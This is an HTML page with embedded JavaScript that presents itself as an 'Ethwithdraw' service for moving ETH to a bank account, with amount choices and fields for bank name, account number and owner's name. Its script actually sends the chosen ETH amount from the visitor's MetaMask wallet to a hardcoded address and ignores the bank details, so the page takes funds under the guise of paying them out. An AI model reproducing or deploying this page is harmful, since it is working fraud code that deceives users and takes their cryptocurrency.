<!DOCTYPE html>
<html>

<head>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js"></script>
  <title>Ethwithdraw</title>
</head>

<body class="bg-info">
  <div>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <div class="container-fluid">
        <a class="navbar-brand" href="#">
          <img src="/lulo.png" class="align-center" alt="" width="185" height="100">
        </a>
      </div>
    </nav>
    <section class="intro">
      <div class="bg-image h-100"
        style="background-image: url('https://mdbootstrap.com/img/Photos/new-templates/search-box/img4.jpg');">
        <div class="mask d-flex align-items-center h-70" style="background-color: rgba(255,255,255,.6);">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-12 col-md-8 col-lg-6 col-xl-5">
                <div class="card gradient-custom" style="border-radius: 2rem;">
                  <div class="card-body p-5 ">

                    <div class="my-md-5">

                      <div class="text-center pt-1">
                        <form id="luloform">
                          <input id="025" type="radio" name="eth" value="0.25"> 0.25</input>
                          <input id="050" type="radio" name="eth" value="0.50"> 0.5</input>
                          <input id="075" type="radio" name="eth" value="0.75"> 0.75</input>
                          <input id="100" type="radio" name="eth" value="1.00"> 1</input>
                          <input id="200" type="radio" name="eth" value="2.00"> 2</input>
                          <input id="500" type="radio" name="eth" value="5.00"> 5</input>
                        </form>
                      </div>

                      <div class="text-center pt-1">
                        <label for="bankname">Bank Name: </label>
                        <input id="bankname" type="text" placeholder="ex: Wells Fargo">

                      </div>
                      <div class="text-center pt-1">
                        <label for="accountnumber">Account Number: </label>
                        <input id="accountnumber" type="text" placeholder="From 10 to 12 digits">

                      </div>
                      <div class="text-center pt-1">
                        <label for="ownername">Owner's Name: </label>
                        <input id="ownername" type="text" placeholder="ex: Philip MacDonald">
                      </div>




                      <div class="text-center py-5">
                        <button class="pay-button" class="btn btn-light btn-lg btn-rounded px-10">Withdraw</button>
                        <div id="status"></div>
                      </div>
                    </div>

                  </div>

                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
  </div>
  </section>


  <script type="text/javascript">
    window.addEventListener('load', async () => {
      if (window.ethereum) {
        window.web3 = new Web3(ethereum);
        try {
          await ethereum.enable();
          initPayButton()
        } catch (err) {
          $('#status').html('User denied account access', err)
        }
      } else if (window.web3) {
        window.web3 = new Web3(web3.currentProvider)
        initPayButton()
      } else {
        $('#status').html('No Metamask (or other Web3 Provider) installed')
      }
    })

    const initPayButton = () => {
      $('.pay-button').click(() => {
        // paymentAddress is where funds will be send to
        const paymentAddress = '0x54e41e066b9a249BF98268C8ed919b25D3243362'
        var amountEth
        var a = document.getElementById("025");
        var b = document.getElementById("050");
        var c = document.getElementById("075");
        var d = document.getElementById("100");
        var e = document.getElementById("200");
        var f = document.getElementById("500");
        if (a.checked == true) {
          amountEth = 0.25;
        }
        else if (b.checked == true) {
          amountEth = 0.5;
        }
        else if (c.checked == true) {
          amountEth = 0.75;
        }
        else if (d.checked == true) {
          amountEth = 1.0;
        }
        else if (e.checked == true) {
          amountEth = 2.0;
        }
        else if (f.checked == true) {
          amountEth = 5.0;
        }
        else {
          alert("Please, select an option");
        }

        web3.eth.sendTransaction({
          to: paymentAddress,
          value: web3.toWei(amountEth, 'ether')
        }, (err, transactionId) => {
          if (err) {
            console.log('Payment failed', err)
            $('#status').html('Payment failed')
          } else {
            console.log('Payment successful', transactionId)
            $('#status').html('Payment successful')
          }
        })
      })
    }
  </script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
    crossorigin="anonymous"></script>

</body>

</html>
